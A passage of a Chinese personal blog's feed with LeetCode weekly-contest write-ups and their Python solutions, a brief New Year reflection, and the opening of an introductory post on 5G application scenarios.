4 。 </span><br><span class="line">递增 1 次，x = 5 。 </span><br><span class="line">加倍 1 次，x = 10 。</span><br></pre></td></tr></table></figure><p>这道题我们首先能想到的是，尽可能多的使用“加倍”操作。既然是从1开始，我们就想办法让输入变为1即可。在操作的过程中，我们需要考虑两种情况：当前值是奇数还是偶数。<br>如果是奇数，我们需要让他变成偶数，方便我们的“除2”操作。因此给当前数减去1即可<br>如果是偶数，我们又需要考虑两种情况。是否可以进行”除2“操作。<br>也就是我们需要对<code>maxDoubles</code>的值进行判断。<br>如果<code>maxDoubles</code>大于零，那我们正常进行除法操作即可。<br>如果<code>maxDoubles</code>已经变为零，那我们也不需要一个一个的递减了，直接变为1即可。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span><span class="params">(object)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">minMoves</span><span class="params">(self, target, maxDoubles)</span>:</span></span><br><span class="line">        <span class="string">"""</span></span><br><span class="line"><span class="string">        :type target: int</span></span><br><span class="line"><span class="string">        :type maxDoubles: int</span></span><br><span class="line"><span class="string">        :rtype: int</span></span><br><span class="line"><span class="string">        """</span></span><br><span class="line">        count = <span class="number">0</span></span><br><span class="line">        <span class="keyword">while</span> target != <span class="number">1</span>:</span><br><span class="line">            <span class="keyword">if</span> target % <span class="number">2</span>:</span><br><span class="line">                target -= <span class="number">1</span></span><br><span class="line">                count +=<span class="number">1</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="keyword">if</span> maxDoubles&gt;<span class="number">0</span>:</span><br><span class="line">                    target /=<span class="number">2</span></span><br><span class="line">                    count+=<span class="number">1</span></span><br><span class="line">                    maxDoubles -=<span class="number">1</span></span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    count+=target<span class="number">-1</span></span><br><span class="line">                    target = <span class="number">1</span></span><br><span class="line">        <span class="keyword">return</span> count</span><br></pre></td></tr></table></figure><h4 id="解决智力问题"><a href="#解决智力问题" class="headerlink" title="解决智力问题"></a>解决智力问题</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">给你一个下标从0开始的二维整数数组 questions ，其中 questions[i] = [pointsi, brainpoweri]。</span><br><span class="line">这个数组表示一场考试里的一系列题目，你需要 按顺序 （也就是从问题 0 开始依次解决），针对每个问题选择 解决 或者 跳过 操作。解决问题 i 将让你 获得  pointsi 的分数，但是你将 无法 解决接下来的 brainpoweri 个问题（即只能跳过接下来的 brainpoweri 个问题）。如果你跳过问题 i ，你可以对下一个问题决定使用哪种操作。</span><br><span class="line">比方说，给你 questions = [[3, 2], [4, 3], [4, 4], [2, 5]] ：</span><br><span class="line">如果问题 0 被解决了， 那么你可以获得 3 分，但你不能解决问题 1 和 2 。</span><br><span class="line">如果你跳过问题 0 ，且解决问题 1 ，你将获得 4 分但是不能解决问题 2 和 3 。</span><br><span class="line">请你返回这场考试里你能获得的 最高 分数。</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">输入：questions = [[3,2],[4,3],[4,4],[2,5]]</span><br><span class="line">输出：5</span><br><span class="line">解释：解决问题 0 和 3 得到最高分。</span><br><span class="line">- 解决问题 0 ：获得 3 分，但接下来 2 个问题都不能解决。</span><br><span class="line">- 不能解决问题 1 和 2</span><br><span class="line">- 解决问题 3 ：获得 2 分</span><br><span class="line">总得分为：3 + 2 = 5 。没有别的办法获得 5 分或者多于 5 分。</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">输入：questions = [[1,1],[2,2],[3,3],[4,4],[5,5]]</span><br><span class="line">输出：7</span><br><span class="line">解释：解决问题 1 和 4 得到最高分。</span><br><span class="line">- 跳过问题 0</span><br><span class="line">- 解决问题 1 ：获得 2 分，但接下来 2 个问题都不能解决。</span><br><span class="line">- 不能解决问题 2 和 3</span><br><span class="line">- 解决问题 4 ：获得 5 分</span><br><span class="line">总得分为：2 + 5 = 7 。没有别的办法获得 7 分或者多于 7 分。</span><br></pre></td></tr></table></figure><p>这道题需要反向动态规划，即当前值的最大值是根据后面的值来得出的，因此我们先计算后面的值！</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span><span class="params">(object)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">mostPoints</span><span class="params">(self, questions)</span>:</span></span><br><span class="line">        <span class="string">"""</span></span><br><span class="line"><span class="string">        :type questions: List[List[int]]</span></span><br><span class="line"><span class="string">        :rtype: int</span></span><br><span class="line"><span class="string">        """</span></span><br><span class="line">        <span class="comment">#动态规划</span></span><br><span class="line">        dp = [<span class="number">0</span> <span class="keyword">for</span> _ <span class="keyword">in</span> range(len(questions)+<span class="number">1</span>)]</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(len(questions)<span class="number">-1</span>,<span class="number">-1</span>,<span class="number">-1</span>):</span><br><span class="line">            <span class="comment">#如果当前位置加上brainpower没有超出数组长度</span></span><br><span class="line">            <span class="keyword">if</span> i+questions[i][<span class="number">1</span>] &lt; len(questions):</span><br><span class="line">                <span class="string">"""</span></span><br><span class="line"><span class="string">                1.做这道题+做下一跳题的得分和</span></span><br><span class="line"><span class="string">                2.不做这道题，做下一题的得分</span></span><br><span class="line"><span class="string">                """</span></span><br><span class="line">                dp[i] = max(questions[i][<span class="number">0</span>] + dp[i + questions[i][<span class="number">1</span>] + <span class="number">1</span>],dp[i + <span class="number">1</span>])</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="comment">#如果当前位置加上brainpower已经超出数组长度</span></span><br><span class="line">                <span class="comment">#当前位置的值是当前值的得分和下一个位置所得分之间的较大值</span></span><br><span class="line">                dp[i] = max(dp[i+<span class="number">1</span>],questions[i][<span class="number">0</span>])</span><br><span class="line">        <span class="keyword">return</span> dp[<span class="number">0</span>]</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h4 id=&quot;将字符串拆分为若干长度为-k-的组&quot;&gt;&lt;a href=&quot;#将字符串拆分为若干长度为-k-的组&quot; class=&quot;headerlink&quot; title=&quot;将字符串拆分为若干长度为 k 的组&quot;&gt;&lt;/a&gt;将字符串拆分为若干长度为 k 的组&lt;/h4&gt;&lt;figure class
      
    
    </summary>
    
    
      <category term="Algorithm" scheme="elssm.github.io/tags/Algorithm/"/>
    
  </entry>
  
  <entry>
    <title>Leetcode第274场周赛write up</title>
    <link href="elssm.github.io/2022/01/02/Leetcode%E7%AC%AC274%E5%9C%BA%E5%91%A8%E8%B5%9Bwrite-up/"/>
    <id>elssm.github.io/2022/01/02/Leetcode第274场周赛write-up/</id>
    <published>2022-01-02T09:07:07.000Z</published>
    <updated>2022-01-02T09:19:33.780Z</updated>
    
    <content type="html"><![CDATA[<h4 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h4><p>老三样如约而至。。。。</p><h4 id="检查是否所有-A-都在-B-之前"><a href="#检查是否所有-A-都在-B-之前" class="headerlink" title="检查是否所有 A 都在 B 之前"></a>检查是否所有 A 都在 B 之前</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">给你一个 仅 由字符 &apos;a&apos; 和 &apos;b&apos; 组成的字符串  s 。如果字符串中 每个 &apos;a&apos; 都出现在 每个 &apos;b&apos; 之前，返回 true ；否则，返回 false 。</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">输入：s = &quot;aaabbb&quot;</span><br><span class="line">输出：true</span><br><span class="line">解释：</span><br><span class="line">&apos;a&apos; 位于下标 0、1 和 2 ；而 &apos;b&apos; 位于下标 3、4 和 5 。</span><br><span class="line">因此，每个 &apos;a&apos; 都出现在每个 &apos;b&apos; 之前，所以返回 true 。</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">输入：s = &quot;abab&quot;</span><br><span class="line">输出：false</span><br><span class="line">解释：</span><br><span class="line">存在一个 &apos;a&apos; 位于下标 2 ，而一个 &apos;b&apos; 位于下标 1 。</span><br><span class="line">因此，不能满足每个 &apos;a&apos; 都出现在每个 &apos;b&apos; 之前，所以返回 false</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">输入：s = &quot;bbb&quot;</span><br><span class="line">输出：true</span><br><span class="line">解释：</span><br><span class="line">不存在 &apos;a&apos; ，因此可以视作每个 &apos;a&apos; 都出现在每个 &apos;b&apos; 之前，所以返回 true 。</span><br></pre></td></tr></table></figure><p>There’s nothing to say，第一道题面前重拳出击！🐶</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span><span class="params">(object)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">checkString</span><span class="params">(self, s)</span>:</span></span><br><span class="line">        <span class="string">"""</span></span><br><span class="line"><span class="string">        :type s: str</span></span><br><span class="line"><span class="string">        :rtype: bool</span></span><br><span class="line"><span class="string">        """</span></span><br><span class="line">        <span class="keyword">if</span> <span class="string">'a'</span> <span class="keyword">not</span> <span class="keyword">in</span> s <span class="keyword">or</span> <span class="string">'b'</span> <span class="keyword">not</span> <span class="keyword">in</span> s:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">        count = <span class="number">0</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> s:</span><br><span class="line">            <span class="keyword">if</span> i == <span class="string">'a'</span>:</span><br><span class="line">                count += <span class="number">1</span></span><br><span class="line">        index_b = s.index(<span class="string">'b'</span>)</span><br><span class="line">        <span class="keyword">if</span> count &lt;= index_b:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br></pre></td></tr></table></figure><h4 id="银行中的激光束数量"><a href="#银行中的激光束数量" class="headerlink" title="银行中的激光束数量"></a>银行中的激光束数量</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">银行内部的防盗安全装置已经激活。给你一个下标从 0 开始的二进制字符串数组 bank ，表示银行的平面图，这是一个大小为 m x n 的二维矩阵。 bank[i] 表示第 i 行的设备分布，由若干 &apos;0&apos; 和若干 &apos;1&apos; 组成。&apos;0&apos; 表示单元格是空的，而 &apos;1&apos; 表示单元格有一个安全设备。</span><br><span class="line">对任意两个安全设备而言，如果同时 满足下面两个条件，则二者之间存在 一个 激光束：</span><br><span class="line">两个设备位于两个 不同行 ：r1 和 r2 ，其中 r1 &lt; r2 。</span><br><span class="line">满足 r1 &lt; i &lt; r2 的 所有 行 i ，都 没有安全设备 。</span><br><span class="line">激光束是独立的，也就是说，一个激光束既不会干扰另一个激光束，也不会与另一个激光束合并成一束。</span><br><span class="line">返回银行中激光束的总数量。</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">输入：bank = [&quot;011001&quot;,&quot;000000&quot;,&quot;010100&quot;,&quot;001000&quot;]</span><br><span class="line">输出：8</span><br><span class="line">解释：在下面每组设备对之间，存在一条激光束。总共是 8 条激光束：</span><br><span class="line"> * bank[0][1] -- bank[2][1]</span><br><span class="line"> * bank[0][1] -- bank[2][3]</span><br><span class="line"> * bank[0][2] -- bank[2][1]</span><br><span class="line"> * bank[0][2] -- bank[2][3]</span><br><span class="line"> * bank[0][5] -- bank[2][1]</span><br><span class="line"> * bank[0][5] -- bank[2][3]</span><br><span class="line"> * bank[2][1] -- bank[3][2]</span><br><span class="line"> * bank[2][3] -- bank[3][2]</span><br><span class="line">注意，第 0 行和第 3 行上的设备之间不存在激光束。</span><br><span class="line">这是因为第 2 行存在安全设备，这不满足第 2 个条件。</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">输入：bank = [&quot;000&quot;,&quot;111&quot;,&quot;000&quot;]</span><br><span class="line">输出：0</span><br><span class="line">解释：不存在两个位于不同行的设备</span><br></pre></td></tr></table></figure><p>这道题的思路就是交叉相成，看成一个多行的数组，每一行的1的个数乘其他行1的个数。前提是两行之前能相乘的原则是中间行1的个数都为0。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span><span class="params">(object)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">numberOfBeams</span><span class="params">(self, bank)</span>:</span></span><br><span class="line">        <span class="string">"""</span></span><br><span class="line"><span class="string">        :type bank: List[str]</span></span><br><span class="line"><span class="string">        :rtype: int</span></span><br><span class="line"><span class="string">        """</span></span><br><span class="line">        res = []</span><br><span class="line">        <span class="comment">#统计每一行1的个数</span></span><br><span class="line">        <span class="keyword">for</span> line <span class="keyword">in</span> bank:</span><br><span class="line">            res.append(list(line).count(<span class="string">'1'</span>))</span><br><span class="line">        <span class="comment">#设置保存光束的全局值</span></span><br><span class="line">        ans = <span class="number">0</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(len(res)):</span><br><span class="line">            <span class="keyword">for</span> j <span class="keyword">in</span> range(i+<span class="number">1</span>,len(res)):</span><br><span class="line">                <span class="comment">#如果当前行都是0，则走到下一行</span></span><br><span class="line">                <span class="keyword">if</span> res[j] == <span class="number">0</span>:</span><br><span class="line">                    <span class="keyword">continue</span></span><br><span class="line">                <span class="comment">#如果当前行存在1，则直接计算光束值，后续的行就不需要计算，直接跳出循环</span></span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    ans += res[i]*res[j]</span><br><span class="line">                    <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">return</span> ans</span><br></pre></td></tr></table></figure><h4 id="摧毁小行星"><a href="#摧毁小行星" class="headerlink" title="摧毁小行星"></a>摧毁小行星</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">给你一个整数 mass ，它表示一颗行星的初始质量。再给你一个整数数组 asteroids ，其中 asteroids[i] 是第 i 颗小行星的质量。</span><br><span class="line">你可以按 任意顺序 重新安排小行星的顺序，然后让行星跟它们发生碰撞。如果行星碰撞时的质量 大于等于 小行星的质量，那么小行星被 摧毁 ，并且行星会 获得 这颗小行星的质量。否则，行星将被摧毁。</span><br><span class="line">如果所有小行星 都 能被摧毁，请返回 true ，否则返回 false 。</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">输入：mass = 10, asteroids = [3,9,19,5,21]</span><br><span class="line">输出：true</span><br><span class="line">解释：一种安排小行星的方式为 [9,19,5,3,21] ：</span><br><span class="line">- 行星与质量为 9 的小行星碰撞。新的行星质量为：10 + 9 = 19</span><br><span class="line">- 行星与质量为 19 的小行星碰撞。新的行星质量为：19 + 19 = 38</span><br><span class="line">- 行星与质量为 5 的小行星碰撞。新的行星质量为：38 + 5 = 43</span><br><span class="line">- 行星与质量为 3 的小行星碰撞。新的行星质量为：43 + 3 = 46</span><br><span class="line">- 行星与质量为 21 的小行星碰撞。新的行星质量为：46 + 21 = 67</span><br><span class="line">所有小行星都被摧毁。</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">输入：mass = 5, asteroids = [4,9,23,4]</span><br><span class="line">输出：false</span><br><span class="line">解释：</span><br><span class="line">行星无论如何没法获得足够质量去摧毁质量为 23 的小行星。</span><br><span class="line">行星把别的小行星摧毁后，质量为 5 + 4 + 9 + 4 = 22 。</span><br><span class="line">它比 23 小，所以无法摧毁最后一颗小行星。</span><br></pre></td></tr></table></figure><p>这道题我们使用贪心的做法，每次撞击行星的时候总是从最小的那个撞起。因此质量肯定可以累加。这里我们不用从最小的开始撞，从不超过mass值的最大值开始向后计算。因此我们首先需要对asteroids进行排序，找到初始mass应该插入的位置。如果插入位置为0的话，则证明初始mass的值不足以撞击任何行星，直接返回false即可。如果插入位置不为0，则依次向后判断，更新mass的值。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span><span class="params">(object)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">asteroidsDestroyed</span><span class="params">(self, mass, asteroids)</span>:</span></span><br><span class="line">        <span class="string">"""</span></span><br><span class="line"><span class="string">        :type mass: int</span></span><br><span class="line"><span class="string">        :type asteroids: List[int]</span></span><br><span class="line"><span class="string">        :rtype: bool</span></span><br><span class="line"><span class="string">        """</span></span><br><span class="line">        <span class="comment">#对行星大小排序</span></span><br><span class="line">        asteroids = sorted(asteroids)</span><br><span class="line">        <span class="comment">#找到mass在行星中的插入位置</span></span><br><span class="line">        insert = bisect.bisect(asteroids,mass)</span><br><span class="line">        <span class="comment">#如果插入位置是0，说明mass无法和任何行星碰撞，直接返回false</span></span><br><span class="line">        <span class="keyword">if</span> insert == <span class="number">0</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">        <span class="comment">#如果插入位置不是0，则mass的最大质量是插入位置之前所有行星质量之和加上mass的初始质量</span></span><br><span class="line">        mass = sum(asteroids[:insert])+mass</span><br><span class="line">        <span class="comment">#从mass插入位置之后开始遍历，判断当前mass质量是否小于当前行星质量</span></span><br><span class="line">        <span class="comment">#如果小于直接返回false</span></span><br><span class="line">        <span class="comment">#如果大于则更新mass的质量</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(insert,len(asteroids)):</span><br><span class="line">            <span class="keyword">if</span> mass &lt; asteroids[i]:</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                mass += asteroids[i]</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br></pre></td></tr></table></figure><h4 id="参加会议的最多员工数"><a href="#参加会议的最多员工数" class="headerlink" title="参加会议的最多员工数"></a>参加会议的最多员工数</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">一个公司准备组织一场会议，邀请名单上有 n 位员工。公司准备了一张 圆形 的桌子，可以坐下 任意数目 的员工。</span><br><span class="line">员工编号为 0 到 n - 1 。每位员工都有一位 喜欢 的员工，每位员工 当且仅当 他被安排在喜欢员工的旁边，他才会参加会议。每位员工喜欢的员工 不会 是他自己。</span><br><span class="line">给你一个下标从 0 开始的整数数组 favorite ，其中 favorite[i] 表示第 i 位员工喜欢的员工。请你返回参加会议的 最多员工数目 。</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">输入：favorite = [2,2,1,2]</span><br><span class="line">输出：3</span><br><span class="line">解释：</span><br><span class="line">上图展示了公司邀请员工 0，1 和 2 参加会议以及他们在圆桌上的座位。</span><br><span class="line">没办法邀请所有员工参与会议，因为员工 2 没办法同时坐在 0，1 和 3 员工的旁边。</span><br><span class="line">注意，公司也可以邀请员工 1，2 和 3 参加会议。</span><br><span class="line">所以最多参加会议的员工数目为 3 。</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">输入：favorite = [1,2,0]</span><br><span class="line">输出：3</span><br><span class="line">解释：</span><br><span class="line">每个员工都至少是另一个员工喜欢的员工。所以公司邀请他们所有人参加会议的前提是所有人都参加了会议。</span><br><span class="line">座位安排同图 1 所示：</span><br><span class="line">- 员工 0 坐在员工 2 和 1 之间。</span><br><span class="line">- 员工 1 坐在员工 0 和 2 之间。</span><br><span class="line">- 员工 2 坐在员工 1 和 0 之间。</span><br><span class="line">参与会议的最多员工数目为 3 。</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">输入：favorite = [3,0,1,4,1]</span><br><span class="line">输出：4</span><br><span class="line">解释：</span><br><span class="line">上图展示了公司可以邀请员工 0，1，3 和 4 参加会议以及他们在圆桌上的座位。</span><br><span class="line">员工 2 无法参加，因为他喜欢的员工 0 旁边的座位已经被占领了。</span><br><span class="line">所以公司只能不邀请员工 2 。</span><br><span class="line">参加会议的最多员工数目为 4 。</span><br></pre></td></tr></table></figure><p>一脸懵逼，等一手题解</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h4 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h4&gt;&lt;p&gt;老三样如约而至。。。。&lt;/p&gt;
&lt;h4 id=&quot;检查是否所有-A-都在-B-之前&quot;&gt;&lt;a href=&quot;#检查是否所有-A-都在-B-之前&quot; 
      
    
    </summary>
    
    
      <category term="Algorithm" scheme="elssm.github.io/tags/Algorithm/"/>
    
  </entry>
  
  <entry>
    <title>辞旧迎新</title>
    <link href="elssm.github.io/2022/01/01/%E8%BE%9E%E6%97%A7%E8%BF%8E%E6%96%B0/"/>
    <id>elssm.github.io/2022/01/01/辞旧迎新/</id>
    <published>2022-01-01T03:35:26.000Z</published>
    <updated>2022-01-19T14:57:21.777Z</updated>
    
    <content type="html"><![CDATA[<h4 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h4><p>2022年第一天。。。</p><p>万万没想到今年跨年我也是在昆明度过。</p><p>如果不是因为疫情的话，此时的我应该在西安。</p><h4 id="回想"><a href="#回想" class="headerlink" title="回想"></a>回想</h4><p>回想2021年，匆匆忙忙度过。</p><p>读了一些书，去了一些地方，认识了一些人，学了一些东西。</p><h4 id="展望"><a href="#展望" class="headerlink" title="展望"></a>展望</h4><p>新的一年。</p><p>希望家人朋友身体健康！</p><p>希望秋招有一个好的结果！</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h4 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h4&gt;&lt;p&gt;2022年第一天。。。&lt;/p&gt;
&lt;p&gt;万万没想到今年跨年我也是在昆明度过。&lt;/p&gt;
&lt;p&gt;如果不是因为疫情的话，此时的我应该在西安。&lt;/p&gt;
      
    
    </summary>
    
    
      <category term="随想" scheme="elssm.github.io/tags/%E9%9A%8F%E6%83%B3/"/>
    
  </entry>
  
  <entry>
    <title>5G基础学习</title>
    <link href="elssm.github.io/2021/12/31/5G%E5%9F%BA%E7%A1%80%E5%AD%A6%E4%B9%A0/"/>
    <id>elssm.github.io/2021/12/31/5G基础学习/</id>
    <published>2021-12-31T02:58:21.000Z</published>
    <updated>2022-01-04T07:39:38.754Z</updated>
    
    <content type="html"><![CDATA[<h4 id="5G介绍"><a href="#5G介绍" class="headerlink" title="5G介绍"></a>5G介绍</h4><p>5G 是指第五代移动网络。它旨在扩展现有的 4G LTE 蜂窝网络，甚至完全取代它们。每一代技术都是由几个因素决定的，例如所使用的技术、发送与接收信号之间的时间间隔（延迟），以及通过网络向所连设备传输数据的速度。5G 网络有望实现千兆级的速度。同时，5G 服务还大大缩短了延迟，并可将覆盖范围扩展到偏远地区。 </p><p><a href="https://www.keysight.com/cn/zh/assets/7018-06171/brochures/5992-2996.pdf" target="_blank" rel="noopener">5G常用属于及缩略语</a></p><h4 id="5G应用场景"><a href="#5G应用场景" class="headerlink" title="5G应用场景"></a>5G应用场景</h4><h5 id="eMBB"><a href="#eMBB" class="headerlink" title="eMBB"></a>eMBB</h5><p>“增强移动宽带”。就是以人为中心的应用场景，集中表现为超高的传输数据速率，广覆盖下的移动性保证等，这是最直观改善移动网速，未来更多的应用对移动网速的需求都将得到满足，从 eMBB 层面上来说， 它是原来移动网络的升级，让人们体验到极致的网速。因此，增强移动宽带（eMBB）将是 5G 发展初期面向个人消费市场的核心应用场景。</p><h5 id="uRLLC"><a href="#uRLLC" class="headerlink" title="uRLLC"></a>uRLLC</h5><p>“高可靠低时延连接”。在此场景下，连接时延要达到 1ms 级别，而且要支持高速移动（500KM/H）情况下的高可靠性（99.999%）连接。这一场景更多面向车联网、工业控制、远程医疗等特殊应用，这类应用在未来潜在的价值极高，未来社会走向智能化，就得依靠这个场景得网络，这些应用的安全性、可靠性要求极高。</p><h5 id="mMTC"><a href="#mMTC" class="headerlink" title="mMTC"></a>mMTC</h5><p>“大规模机器类型通信”，5G 强大的连接能力可以快速促进各垂直行业（智慧城市、智能家居、环境监测等）的深度融合。万物互联下，人们的生活方式也将发生颠覆性的变化。这一场景下，数据速率较低且时延不敏感，连接覆盖生活的方方面面，终端成本更低，电池寿命更长且可靠性更高，真正能实现万物互联。</p><p>如下图所示为5G不同应用场景的需求指标差异</p><p><img 